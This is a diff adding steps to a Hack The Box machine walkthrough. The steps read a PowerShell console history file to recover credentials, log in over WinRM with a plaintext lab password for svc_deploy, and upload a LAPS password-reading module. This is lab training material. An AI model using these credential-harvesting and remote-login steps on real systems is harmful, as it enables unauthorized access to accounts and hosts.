@@ -40,4 +40,17 @@ evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u
 ![image](https://github.com/regarmulia/HTB/assets/33616880/dbc9049b-bc5b-4ae5-bf13-61229ef18444)
 
 
+```
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/f6ebf0ae-9a32-4cdb-9a80-fd852960949d)
+
+
+```
+evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+net user svc_deploy
+upload AdmPwd.PS
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/0eeb2fa9-09a1-4cc8-9c21-69219178b416)
+
 
